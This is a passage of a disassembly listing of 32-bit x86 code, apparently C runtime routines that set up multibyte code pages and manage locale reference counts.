  403fe5:	80 4c 0e 1d 20       	orb    $0x20,0x1d(%esi,%ecx,1)
  403fea:	8a d1                	mov    %cl,%dl
  403fec:	80 ea 20             	sub    $0x20,%dl
  403fef:	88 10                	mov    %dl,(%eax)
  403ff1:	eb 03                	jmp    0x403ff6
  403ff3:	c6 00 00             	movb   $0x0,(%eax)
  403ff6:	41                   	inc    %ecx
  403ff7:	3b cf                	cmp    %edi,%ecx
  403ff9:	72 c2                	jb     0x403fbd
  403ffb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403ffe:	5f                   	pop    %edi
  403fff:	33 cd                	xor    %ebp,%ecx
  404001:	5b                   	pop    %ebx
  404002:	e8 e8 0b 00 00       	call   0x404bef
  404007:	c9                   	leave
  404008:	c3                   	ret
  404009:	6a 0c                	push   $0xc
  40400b:	68 68 b6 40 00       	push   $0x40b668
  404010:	e8 0b ef ff ff       	call   0x402f20
  404015:	e8 ff eb ff ff       	call   0x402c19
  40401a:	8b f8                	mov    %eax,%edi
  40401c:	a1 44 da 40 00       	mov    0x40da44,%eax
  404021:	85 47 70             	test   %eax,0x70(%edi)
  404024:	74 1d                	je     0x404043
  404026:	83 7f 6c 00          	cmpl   $0x0,0x6c(%edi)
  40402a:	74 17                	je     0x404043
  40402c:	8b 77 68             	mov    0x68(%edi),%esi
  40402f:	85 f6                	test   %esi,%esi
  404031:	75 08                	jne    0x40403b
  404033:	6a 20                	push   $0x20
  404035:	e8 62 db ff ff       	call   0x401b9c
  40403a:	59                   	pop    %ecx
  40403b:	8b c6                	mov    %esi,%eax
  40403d:	e8 23 ef ff ff       	call   0x402f65
  404042:	c3                   	ret
  404043:	6a 0d                	push   $0xd
  404045:	e8 0c 1b 00 00       	call   0x405b56
  40404a:	59                   	pop    %ecx
  40404b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40404f:	8b 77 68             	mov    0x68(%edi),%esi
  404052:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  404055:	3b 35 48 d9 40 00    	cmp    0x40d948,%esi
  40405b:	74 36                	je     0x404093
  40405d:	85 f6                	test   %esi,%esi
  40405f:	74 1a                	je     0x40407b
  404061:	56                   	push   %esi
  404062:	ff 15 b8 a0 40 00    	call   *0x40a0b8
  404068:	85 c0                	test   %eax,%eax
  40406a:	75 0f                	jne    0x40407b
  40406c:	81 fe 20 d5 40 00    	cmp    $0x40d520,%esi
  404072:	74 07                	je     0x40407b
  404074:	56                   	push   %esi
  404075:	e8 71 07 00 00       	call   0x4047eb
  40407a:	59                   	pop    %ecx
  40407b:	a1 48 d9 40 00       	mov    0x40d948,%eax
  404080:	89 47 68             	mov    %eax,0x68(%edi)
  404083:	8b 35 48 d9 40 00    	mov    0x40d948,%esi
  404089:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40408c:	56                   	push   %esi
  40408d:	ff 15 b0 a0 40 00    	call   *0x40a0b0
  404093:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40409a:	e8 05 00 00 00       	call   0x4040a4
  40409f:	eb 8e                	jmp    0x40402f
  4040a1:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4040a4:	6a 0d                	push   $0xd
  4040a6:	e8 d1 19 00 00       	call   0x405a7c
  4040ab:	59                   	pop    %ecx
  4040ac:	c3                   	ret
  4040ad:	8b ff                	mov    %edi,%edi
  4040af:	55                   	push   %ebp
  4040b0:	8b ec                	mov    %esp,%ebp
  4040b2:	83 ec 10             	sub    $0x10,%esp
  4040b5:	53                   	push   %ebx
  4040b6:	33 db                	xor    %ebx,%ebx
  4040b8:	53                   	push   %ebx
  4040b9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4040bc:	e8 98 d6 ff ff       	call   0x401759
  4040c1:	89 1d 84 e3 40 00    	mov    %ebx,0x40e384
  4040c7:	83 fe fe             	cmp    $0xfffffffe,%esi
  4040ca:	75 1e                	jne    0x4040ea
  4040cc:	c7 05 84 e3 40 00 01 	movl   $0x1,0x40e384
  4040d3:	00 00 00 
  4040d6:	ff 15 f4 a0 40 00    	call   *0x40a0f4
  4040dc:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  4040df:	74 45                	je     0x404126
  4040e1:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4040e4:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  4040e8:	eb 3c                	jmp    0x404126
  4040ea:	83 fe fd             	cmp    $0xfffffffd,%esi
  4040ed:	75 12                	jne    0x404101
  4040ef:	c7 05 84 e3 40 00 01 	movl   $0x1,0x40e384
  4040f6:	00 00 00 
  4040f9:	ff 15 f0 a0 40 00    	call   *0x40a0f0
  4040ff:	eb db                	jmp    0x4040dc
  404101:	83 fe fc             	cmp    $0xfffffffc,%esi
  404104:	75 12                	jne    0x404118
  404106:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404109:	8b 40 04             	mov    0x4(%eax),%eax
  40410c:	c7 05 84 e3 40 00 01 	movl   $0x1,0x40e384
  404113:	00 00 00 
  404116:	eb c4                	jmp    0x4040dc
  404118:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  40411b:	74 07                	je     0x404124
  40411d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404120:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  404124:	8b c6                	mov    %esi,%eax
  404126:	5b                   	pop    %ebx
  404127:	c9                   	leave
  404128:	c3                   	ret
  404129:	8b ff                	mov    %edi,%edi
  40412b:	55                   	push   %ebp
  40412c:	8b ec                	mov    %esp,%ebp
  40412e:	83 ec 20             	sub    $0x20,%esp
  404131:	a1 60 db 40 00       	mov    0x40db60,%eax
  404136:	33 c5                	xor    %ebp,%eax
  404138:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40413b:	53                   	push   %ebx
  40413c:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40413f:	56                   	push   %esi
  404140:	8b 75 08             	mov    0x8(%ebp),%esi
  404143:	57                   	push   %edi
  404144:	e8 64 ff ff ff       	call   0x4040ad
  404149:	8b f8                	mov    %eax,%edi
  40414b:	33 f6                	xor    %esi,%esi
  40414d:	89 7d 08             	mov    %edi,0x8(%ebp)
  404150:	3b fe                	cmp    %esi,%edi
  404152:	75 0e                	jne    0x404162
  404154:	8b c3                	mov    %ebx,%eax
  404156:	e8 b7 fc ff ff       	call   0x403e12
  40415b:	33 c0                	xor    %eax,%eax
  40415d:	e9 9d 01 00 00       	jmp    0x4042ff
  404162:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  404165:	33 c0                	xor    %eax,%eax
  404167:	39 b8 50 d9 40 00    	cmp    %edi,0x40d950(%eax)
  40416d:	0f 84 91 00 00 00    	je     0x404204
  404173:	ff 45 e4             	incl   -0x1c(%ebp)
  404176:	83 c0 30             	add    $0x30,%eax
  404179:	3d f0 00 00 00       	cmp    $0xf0,%eax
  40417e:	72 e7                	jb     0x404167
  404180:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
  404186:	0f 84 70 01 00 00    	je     0x4042fc
  40418c:	81 ff e9 fd 00 00    	cmp    $0xfde9,%edi
  404192:	0f 84 64 01 00 00    	je     0x4042fc
  404198:	0f b7 c7             	movzwl %di,%eax
  40419b:	50                   	push   %eax
  40419c:	ff 15 f8 a0 40 00    	call   *0x40a0f8
  4041a2:	85 c0                	test   %eax,%eax
  4041a4:	0f 84 52 01 00 00    	je     0x4042fc
  4041aa:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4041ad:	50                   	push   %eax
  4041ae:	57                   	push   %edi
  4041af:	ff 15 ec a0 40 00    	call   *0x40a0ec
  4041b5:	85 c0                	test   %eax,%eax
  4041b7:	0f 84 33 01 00 00    	je     0x4042f0
  4041bd:	68 01 01 00 00       	push   $0x101
  4041c2:	8d 43 1c             	lea    0x1c(%ebx),%eax
  4041c5:	56                   	push   %esi
  4041c6:	50                   	push   %eax
  4041c7:	e8 d4 0a 00 00       	call   0x404ca0
  4041cc:	33 d2                	xor    %edx,%edx
  4041ce:	42                   	inc    %edx
  4041cf:	83 c4 0c             	add    $0xc,%esp
  4041d2:	89 7b 04             	mov    %edi,0x4(%ebx)
  4041d5:	89 73 0c             	mov    %esi,0xc(%ebx)
  4041d8:	39 55 e8             	cmp    %edx,-0x18(%ebp)
  4041db:	0f 86 f8 00 00 00    	jbe    0x4042d9
  4041e1:	80 7d ee 00          	cmpb   $0x0,-0x12(%ebp)
  4041e5:	0f 84 cf 00 00 00    	je     0x4042ba
  4041eb:	8d 75 ef             	lea    -0x11(%ebp),%esi
  4041ee:	8a 0e                	mov    (%esi),%cl
  4041f0:	84 c9                	test   %cl,%cl
  4041f2:	0f 84 c2 00 00 00    	je     0x4042ba
  4041f8:	0f b6 46 ff          	movzbl -0x1(%esi),%eax
  4041fc:	0f b6 c9             	movzbl %cl,%ecx
  4041ff:	e9 a6 00 00 00       	jmp    0x4042aa
  404204:	68 01 01 00 00       	push   $0x101
  404209:	8d 43 1c             	lea    0x1c(%ebx),%eax
  40420c:	56                   	push   %esi
  40420d:	50                   	push   %eax
  40420e:	e8 8d 0a 00 00       	call   0x404ca0
  404213:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  404216:	83 c4 0c             	add    $0xc,%esp
  404219:	6b c9 30             	imul   $0x30,%ecx,%ecx
  40421c:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40421f:	8d b1 60 d9 40 00    	lea    0x40d960(%ecx),%esi
  404225:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  404228:	eb 2a                	jmp    0x404254
  40422a:	8a 46 01             	mov    0x1(%esi),%al
  40422d:	84 c0                	test   %al,%al
  40422f:	74 28                	je     0x404259
  404231:	0f b6 3e             	movzbl (%esi),%edi
  404234:	0f b6 c0             	movzbl %al,%eax
  404237:	eb 12                	jmp    0x40424b
  404239:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40423c:	8a 80 4c d9 40 00    	mov    0x40d94c(%eax),%al
  404242:	08 44 3b 1d          	or     %al,0x1d(%ebx,%edi,1)
  404246:	0f b6 46 01          	movzbl 0x1(%esi),%eax
  40424a:	47                   	inc    %edi
  40424b:	3b f8                	cmp    %eax,%edi
  40424d:	76 ea                	jbe    0x404239
  40424f:	8b 7d 08             	mov    0x8(%ebp),%edi
  404252:	46                   	inc    %esi
  404253:	46                   	inc    %esi
  404254:	80 3e 00             	cmpb   $0x0,(%esi)
  404257:	75 d1                	jne    0x40422a
  404259:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40425c:	ff 45 e0             	incl   -0x20(%ebp)
  40425f:	83 c6 08             	add    $0x8,%esi
  404262:	83 7d e0 04          	cmpl   $0x4,-0x20(%ebp)
  404266:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  404269:	72 e9                	jb     0x404254
  40426b:	8b c7                	mov    %edi,%eax
  40426d:	89 7b 04             	mov    %edi,0x4(%ebx)
  404270:	c7 43 08 01 00 00 00 	movl   $0x1,0x8(%ebx)
  404277:	e8 67 fb ff ff       	call   0x403de3
  40427c:	6a 06                	push   $0x6
  40427e:	89 43 0c             	mov    %eax,0xc(%ebx)
  404281:	8d 43 10             	lea    0x10(%ebx),%eax
  404284:	8d 89 54 d9 40 00    	lea    0x40d954(%ecx),%ecx
  40428a:	5a                   	pop    %edx
  40428b:	66 8b 31             	mov    (%ecx),%si
  40428e:	41                   	inc    %ecx
  40428f:	66 89 30             	mov    %si,(%eax)
  404292:	41                   	inc    %ecx
  404293:	40                   	inc    %eax
  404294:	40                   	inc    %eax
  404295:	4a                   	dec    %edx
  404296:	75 f3                	jne    0x40428b
  404298:	8b f3                	mov    %ebx,%esi
  40429a:	e8 d7 fb ff ff       	call   0x403e76
  40429f:	e9 b7 fe ff ff       	jmp    0x40415b
  4042a4:	80 4c 03 1d 04       	orb    $0x4,0x1d(%ebx,%eax,1)
  4042a9:	40                   	inc    %eax
  4042aa:	3b c1                	cmp    %ecx,%eax
  4042ac:	76 f6                	jbe    0x4042a4
  4042ae:	46                   	inc    %esi
  4042af:	46                   	inc    %esi
  4042b0:	80 7e ff 00          	cmpb   $0x0,-0x1(%esi)
  4042b4:	0f 85 34 ff ff ff    	jne    0x4041ee
  4042ba:	8d 43 1e             	lea    0x1e(%ebx),%eax
  4042bd:	b9 fe 00 00 00       	mov    $0xfe,%ecx
  4042c2:	80 08 08             	orb    $0x8,(%eax)
  4042c5:	40                   	inc    %eax
  4042c6:	49                   	dec    %ecx
  4042c7:	75 f9                	jne    0x4042c2
  4042c9:	8b 43 04             	mov    0x4(%ebx),%eax
  4042cc:	e8 12 fb ff ff       	call   0x403de3
  4042d1:	89 43 0c             	mov    %eax,0xc(%ebx)
  4042d4:	89 53 08             	mov    %edx,0x8(%ebx)
  4042d7:	eb 03                	jmp    0x4042dc
  4042d9:	89 73 08             	mov    %esi,0x8(%ebx)
  4042dc:	33 c0                	xor    %eax,%eax
  4042de:	0f b7 c8             	movzwl %ax,%ecx
  4042e1:	8b c1                	mov    %ecx,%eax
  4042e3:	c1 e1 10             	shl    $0x10,%ecx
  4042e6:	0b c1                	or     %ecx,%eax
  4042e8:	8d 7b 10             	lea    0x10(%ebx),%edi
  4042eb:	ab                   	stos   %eax,%es:(%edi)
  4042ec:	ab                   	stos   %eax,%es:(%edi)
  4042ed:	ab                   	stos   %eax,%es:(%edi)
  4042ee:	eb a8                	jmp    0x404298
  4042f0:	39 35 84 e3 40 00    	cmp    %esi,0x40e384
  4042f6:	0f 85 58 fe ff ff    	jne    0x404154
  4042fc:	83 c8 ff             	or     $0xffffffff,%eax
  4042ff:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404302:	5f                   	pop    %edi
  404303:	5e                   	pop    %esi
  404304:	33 cd                	xor    %ebp,%ecx
  404306:	5b                   	pop    %ebx
  404307:	e8 e3 08 00 00       	call   0x404bef
  40430c:	c9                   	leave
  40430d:	c3                   	ret
  40430e:	6a 14                	push   $0x14
  404310:	68 88 b6 40 00       	push   $0x40b688
  404315:	e8 06 ec ff ff       	call   0x402f20
  40431a:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
  40431e:	e8 f6 e8 ff ff       	call   0x402c19
  404323:	8b f8                	mov    %eax,%edi
  404325:	89 7d dc             	mov    %edi,-0x24(%ebp)
  404328:	e8 dc fc ff ff       	call   0x404009
  40432d:	8b 5f 68             	mov    0x68(%edi),%ebx
  404330:	8b 75 08             	mov    0x8(%ebp),%esi
  404333:	e8 75 fd ff ff       	call   0x4040ad
  404338:	89 45 08             	mov    %eax,0x8(%ebp)
  40433b:	3b 43 04             	cmp    0x4(%ebx),%eax
  40433e:	0f 84 57 01 00 00    	je     0x40449b
  404344:	68 20 02 00 00       	push   $0x220
  404349:	e8 4c 05 00 00       	call   0x40489a
  40434e:	59                   	pop    %ecx
  40434f:	8b d8                	mov    %eax,%ebx
  404351:	85 db                	test   %ebx,%ebx
  404353:	0f 84 46 01 00 00    	je     0x40449f
  404359:	b9 88 00 00 00       	mov    $0x88,%ecx
  40435e:	8b 77 68             	mov    0x68(%edi),%esi
  404361:	8b fb                	mov    %ebx,%edi
  404363:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404365:	83 23 00             	andl   $0x0,(%ebx)
  404368:	53                   	push   %ebx
  404369:	ff 75 08             	push   0x8(%ebp)
  40436c:	e8 b8 fd ff ff       	call   0x404129
  404371:	59                   	pop    %ecx
  404372:	59                   	pop    %ecx
  404373:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404376:	85 c0                	test   %eax,%eax
  404378:	0f 85 fc 00 00 00    	jne    0x40447a
  40437e:	8b 75 dc             	mov    -0x24(%ebp),%esi
  404381:	ff 76 68             	push   0x68(%esi)
  404384:	ff 15 b8 a0 40 00    	call   *0x40a0b8
  40438a:	85 c0                	test   %eax,%eax
  40438c:	75 11                	jne    0x40439f
  40438e:	8b 46 68             	mov    0x68(%esi),%eax
  404391:	3d 20 d5 40 00       	cmp    $0x40d520,%eax
  404396:	74 07                	je     0x40439f
  404398:	50                   	push   %eax
  404399:	e8 4d 04 00 00       	call   0x4047eb
  40439e:	59                   	pop    %ecx
  40439f:	89 5e 68             	mov    %ebx,0x68(%esi)
  4043a2:	53                   	push   %ebx
  4043a3:	8b 3d b0 a0 40 00    	mov    0x40a0b0,%edi
  4043a9:	ff d7                	call   *%edi
  4043ab:	f6 46 70 02          	testb  $0x2,0x70(%esi)
  4043af:	0f 85 ea 00 00 00    	jne    0x40449f
  4043b5:	f6 05 44 da 40 00 01 	testb  $0x1,0x40da44
  4043bc:	0f 85 dd 00 00 00    	jne    0x40449f
  4043c2:	6a 0d                	push   $0xd
  4043c4:	e8 8d 17 00 00       	call   0x405b56
  4043c9:	59                   	pop    %ecx
  4043ca:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4043ce:	8b 43 04             	mov    0x4(%ebx),%eax
  4043d1:	a3 94 e3 40 00       	mov    %eax,0x40e394
  4043d6:	8b 43 08             	mov    0x8(%ebx),%eax
  4043d9:	a3 98 e3 40 00       	mov    %eax,0x40e398
  4043de:	8b 43 0c             	mov    0xc(%ebx),%eax
  4043e1:	a3 9c e3 40 00       	mov    %eax,0x40e39c
  4043e6:	33 c0                	xor    %eax,%eax
  4043e8:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4043eb:	83 f8 05             	cmp    $0x5,%eax
  4043ee:	7d 10                	jge    0x404400
  4043f0:	66 8b 4c 43 10       	mov    0x10(%ebx,%eax,2),%cx
  4043f5:	66 89 0c 45 88 e3 40 	mov    %cx,0x40e388(,%eax,2)
  4043fc:	00 
  4043fd:	40                   	inc    %eax
  4043fe:	eb e8                	jmp    0x4043e8
  404400:	33 c0                	xor    %eax,%eax
  404402:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404405:	3d 01 01 00 00       	cmp    $0x101,%eax
  40440a:	7d 0d                	jge    0x404419
  40440c:	8a 4c 18 1c          	mov    0x1c(%eax,%ebx,1),%cl
  404410:	88 88 40 d7 40 00    	mov    %cl,0x40d740(%eax)
  404416:	40                   	inc    %eax
  404417:	eb e9                	jmp    0x404402
  404419:	33 c0                	xor    %eax,%eax
  40441b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40441e:	3d 00 01 00 00       	cmp    $0x100,%eax
  404423:	7d 10                	jge    0x404435
  404425:	8a 8c 18 1d 01 00 00 	mov    0x11d(%eax,%ebx,1),%cl
  40442c:	88 88 48 d8 40 00    	mov    %cl,0x40d848(%eax)
  404432:	40                   	inc    %eax
  404433:	eb e6                	jmp    0x40441b
  404435:	ff 35 48 d9 40 00    	push   0x40d948
  40443b:	ff 15 b8 a0 40 00    	call   *0x40a0b8
  404441:	85 c0                	test   %eax,%eax
  404443:	75 13                	jne    0x404458
  404445:	a1 48 d9 40 00       	mov    0x40d948,%eax
  40444a:	3d 20 d5 40 00       	cmp    $0x40d520,%eax
  40444f:	74 07                	je     0x404458
  404451:	50                   	push   %eax
  404452:	e8 94 03 00 00       	call   0x4047eb
  404457:	59                   	pop    %ecx
  404458:	89 1d 48 d9 40 00    	mov    %ebx,0x40d948
  40445e:	53                   	push   %ebx
  40445f:	ff d7                	call   *%edi
  404461:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404468:	e8 02 00 00 00       	call   0x40446f
  40446d:	eb 30                	jmp    0x40449f
  40446f:	6a 0d                	push   $0xd
  404471:	e8 06 16 00 00       	call   0x405a7c
  404476:	59                   	pop    %ecx
  404477:	c3                   	ret
  404478:	eb 25                	jmp    0x40449f
  40447a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40447d:	75 20                	jne    0x40449f
  40447f:	81 fb 20 d5 40 00    	cmp    $0x40d520,%ebx
  404485:	74 07                	je     0x40448e
  404487:	53                   	push   %ebx
  404488:	e8 5e 03 00 00       	call   0x4047eb
  40448d:	59                   	pop    %ecx
  40448e:	e8 ec d4 ff ff       	call   0x40197f
  404493:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404499:	eb 04                	jmp    0x40449f
  40449b:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  40449f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4044a2:	e8 be ea ff ff       	call   0x402f65
  4044a7:	c3                   	ret
  4044a8:	83 3d cc fa 40 00 00 	cmpl   $0x0,0x40facc
  4044af:	75 12                	jne    0x4044c3
  4044b1:	6a fd                	push   $0xfffffffd
  4044b3:	e8 56 fe ff ff       	call   0x40430e
  4044b8:	59                   	pop    %ecx
  4044b9:	c7 05 cc fa 40 00 01 	movl   $0x1,0x40facc
  4044c0:	00 00 00 
  4044c3:	33 c0                	xor    %eax,%eax
  4044c5:	c3                   	ret
  4044c6:	8b ff                	mov    %edi,%edi
  4044c8:	55                   	push   %ebp
  4044c9:	8b ec                	mov    %esp,%ebp
  4044cb:	53                   	push   %ebx
  4044cc:	56                   	push   %esi
  4044cd:	8b 75 08             	mov    0x8(%ebp),%esi
  4044d0:	8b 86 bc 00 00 00    	mov    0xbc(%esi),%eax
  4044d6:	33 db                	xor    %ebx,%ebx
  4044d8:	57                   	push   %edi
  4044d9:	3b c3                	cmp    %ebx,%eax
  4044db:	74 6f                	je     0x40454c
  4044dd:	3d 68 dd 40 00       	cmp    $0x40dd68,%eax
  4044e2:	74 68                	je     0x40454c
  4044e4:	8b 86 b0 00 00 00    	mov    0xb0(%esi),%eax
  4044ea:	3b c3                	cmp    %ebx,%eax
  4044ec:	74 5e                	je     0x40454c
  4044ee:	39 18                	cmp    %ebx,(%eax)
  4044f0:	75 5a                	jne    0x40454c
  4044f2:	8b 86 b8 00 00 00    	mov    0xb8(%esi),%eax
  4044f8:	3b c3                	cmp    %ebx,%eax
  4044fa:	74 17                	je     0x404513
  4044fc:	39 18                	cmp    %ebx,(%eax)
  4044fe:	75 13                	jne    0x404513
  404500:	50                   	push   %eax
  404501:	e8 e5 02 00 00       	call   0x4047eb
  404506:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  40450c:	e8 1c 3d 00 00       	call   0x40822d
  404511:	59                   	pop    %ecx
  404512:	59                   	pop    %ecx
  404513:	8b 86 b4 00 00 00    	mov    0xb4(%esi),%eax
  404519:	3b c3                	cmp    %ebx,%eax
  40451b:	74 17                	je     0x404534
  40451d:	39 18                	cmp    %ebx,(%eax)
  40451f:	75 13                	jne    0x404534
  404521:	50                   	push   %eax
  404522:	e8 c4 02 00 00       	call   0x4047eb
  404527:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  40452d:	e8 b6 3c 00 00       	call   0x4081e8
  404532:	59                   	pop    %ecx
  404533:	59                   	pop    %ecx
  404534:	ff b6 b0 00 00 00    	push   0xb0(%esi)
  40453a:	e8 ac 02 00 00       	call   0x4047eb
  40453f:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  404545:	e8 a1 02 00 00       	call   0x4047eb
  40454a:	59                   	pop    %ecx
  40454b:	59                   	pop    %ecx
  40454c:	8b 86 c0 00 00 00    	mov    0xc0(%esi),%eax
  404552:	3b c3                	cmp    %ebx,%eax
  404554:	74 44                	je     0x40459a
  404556:	39 18                	cmp    %ebx,(%eax)
  404558:	75 40                	jne    0x40459a
  40455a:	8b 86 c4 00 00 00    	mov    0xc4(%esi),%eax
  404560:	2d fe 00 00 00       	sub    $0xfe,%eax
  404565:	50                   	push   %eax
  404566:	e8 80 02 00 00       	call   0x4047eb
  40456b:	8b 86 cc 00 00 00    	mov    0xcc(%esi),%eax
  404571:	bf 80 00 00 00       	mov    $0x80,%edi
  404576:	2b c7                	sub    %edi,%eax
  404578:	50                   	push   %eax
  404579:	e8 6d 02 00 00       	call   0x4047eb
  40457e:	8b 86 d0 00 00 00    	mov    0xd0(%esi),%eax
  404584:	2b c7                	sub    %edi,%eax
  404586:	50                   	push   %eax
  404587:	e8 5f 02 00 00       	call   0x4047eb
  40458c:	ff b6 c0 00 00 00    	push   0xc0(%esi)
  404592:	e8 54 02 00 00       	call   0x4047eb
  404597:	83 c4 10             	add    $0x10,%esp
  40459a:	8d be d4 00 00 00    	lea    0xd4(%esi),%edi
  4045a0:	8b 07                	mov    (%edi),%eax
  4045a2:	3d a8 dc 40 00       	cmp    $0x40dca8,%eax
  4045a7:	74 17                	je     0x4045c0
  4045a9:	39 98 b4 00 00 00    	cmp    %ebx,0xb4(%eax)
  4045af:	75 0f                	jne    0x4045c0
  4045b1:	50                   	push   %eax
  4045b2:	e8 9c 3a 00 00       	call   0x408053
  4045b7:	ff 37                	push   (%edi)
  4045b9:	e8 2d 02 00 00       	call   0x4047eb
  4045be:	59                   	pop    %ecx
  4045bf:	59                   	pop    %ecx
  4045c0:	8d 7e 50             	lea    0x50(%esi),%edi
  4045c3:	c7 45 08 06 00 00 00 	movl   $0x6,0x8(%ebp)
  4045ca:	81 7f f8 48 da 40 00 	cmpl   $0x40da48,-0x8(%edi)
  4045d1:	74 11                	je     0x4045e4
  4045d3:	8b 07                	mov    (%edi),%eax
  4045d5:	3b c3                	cmp    %ebx,%eax
  4045d7:	74 0b                	je     0x4045e4
  4045d9:	39 18                	cmp    %ebx,(%eax)
  4045db:	75 07                	jne    0x4045e4
  4045dd:	50                   	push   %eax
  4045de:	e8 08 02 00 00       	call   0x4047eb
  4045e3:	59                   	pop    %ecx
  4045e4:	39 5f fc             	cmp    %ebx,-0x4(%edi)
  4045e7:	74 12                	je     0x4045fb
  4045e9:	8b 47 04             	mov    0x4(%edi),%eax
  4045ec:	3b c3                	cmp    %ebx,%eax
  4045ee:	74 0b                	je     0x4045fb
  4045f0:	39 18                	cmp    %ebx,(%eax)
  4045f2:	75 07                	jne    0x4045fb
  4045f4:	50                   	push   %eax
  4045f5:	e8 f1 01 00 00       	call   0x4047eb
  4045fa:	59                   	pop    %ecx
  4045fb:	83 c7 10             	add    $0x10,%edi
  4045fe:	ff 4d 08             	decl   0x8(%ebp)
  404601:	75 c7                	jne    0x4045ca
  404603:	56                   	push   %esi
  404604:	e8 e2 01 00 00       	call   0x4047eb
  404609:	59                   	pop    %ecx
  40460a:	5f                   	pop    %edi
  40460b:	5e                   	pop    %esi
  40460c:	5b                   	pop    %ebx
  40460d:	5d                   	pop    %ebp
  40460e:	c3                   	ret
  40460f:	8b ff                	mov    %edi,%edi
  404611:	55                   	push   %ebp
  404612:	8b ec                	mov    %esp,%ebp
  404614:	53                   	push   %ebx
  404615:	56                   	push   %esi
  404616:	8b 35 b0 a0 40 00    	mov    0x40a0b0,%esi
  40461c:	57                   	push   %edi
  40461d:	8b 7d 08             	mov    0x8(%ebp),%edi
  404620:	57                   	push   %edi
  404621:	ff d6                	call   *%esi
  404623:	8b 87 b0 00 00 00    	mov    0xb0(%edi),%eax
  404629:	85 c0                	test   %eax,%eax
  40462b:	74 03                	je     0x404630
  40462d:	50                   	push   %eax
  40462e:	ff d6                	call   *%esi
  404630:	8b 87 b8 00 00 00    	mov    0xb8(%edi),%eax
  404636:	85 c0                	test   %eax,%eax
  404638:	74 03                	je     0x40463d
  40463a:	50                   	push   %eax
  40463b:	ff d6                	call   *%esi
  40463d:	8b 87 b4 00 00 00    	mov    0xb4(%edi),%eax
  404643:	85 c0                	test   %eax,%eax
  404645:	74 03                	je     0x40464a
  404647:	50                   	push   %eax
  404648:	ff d6                	call   *%esi
  40464a:	8b 87 c0 00 00 00    	mov    0xc0(%edi),%eax
  404650:	85 c0                	test   %eax,%eax
  404652:	74 03                	je     0x404657
  404654:	50                   	push   %eax
  404655:	ff d6                	call   *%esi
  404657:	8d 5f 50             	lea    0x50(%edi),%ebx
  40465a:	c7 45 08 06 00 00 00 	movl   $0x6,0x8(%ebp)
  404661:	81 7b f8 48 da 40 00 	cmpl   $0x40da48,-0x8(%ebx)
  404668:	74 09                	je     0x404673
  40466a:	8b 03                	mov    (%ebx),%eax
  40466c:	85 c0                	test   %eax,%eax
  40466e:	74 03                	je     0x404673
  404670:	50                   	push   %eax
  404671:	ff d6                	call   *%esi
  404673:	83 7b fc 00          	cmpl   $0x0,-0x4(%ebx)
  404677:	74 0a                	je     0x404683
  404679:	8b 43 04             	mov    0x4(%ebx),%eax
  40467c:	85 c0                	test   %eax,%eax
  40467e:	74 03                	je     0x404683
  404680:	50                   	push   %eax
  404681:	ff d6                	call   *%esi
  404683:	83 c3 10             	add    $0x10,%ebx
  404686:	ff 4d 08             	decl   0x8(%ebp)
  404689:	75 d6                	jne    0x404661
  40468b:	8b 87 d4 00 00 00    	mov    0xd4(%edi),%eax
  404691:	05 b4 00 00 00       	add    $0xb4,%eax
  404696:	50                   	push   %eax
  404697:	ff d6                	call   *%esi
  404699:	5f                   	pop    %edi
  40469a:	5e                   	pop    %esi
  40469b:	5b                   	pop    %ebx
  40469c:	5d                   	pop    %ebp
  40469d:	c3                   	ret
  40469e:	8b ff                	mov    %edi,%edi
  4046a0:	55                   	push   %ebp
  4046a1:	8b ec                	mov    %esp,%ebp
  4046a3:	57                   	push   %edi
  4046a4:	8b 7d 08             	mov    0x8(%ebp),%edi
  4046a7:	85 ff                	test   %edi,%edi
  4046a9:	0f 84 83 00 00 00    	je     0x404732
  4046af:	53                   	push   %ebx
  4046b0:	56                   	push   %esi
  4046b1:	8b 35 b8 a0 40 00    	mov    0x40a0b8,%esi
  4046b7:	57                   	push   %edi
  4046b8:	ff d6                	call   *%esi
  4046ba:	8b 87 b0 00 00 00    	mov    0xb0(%edi),%eax
  4046c0:	85 c0                	test   %eax,%eax
  4046c2:	74 03                	je     0x4046c7
  4046c4:	50                   	push   %eax
  4046c5:	ff d6                	call   *%esi
  4046c7:	8b 87 b8 00 00 00    	mov    0xb8(%edi),%eax
  4046cd:	85 c0                	test   %eax,%eax
  4046cf:	74 03                	je     0x4046d4
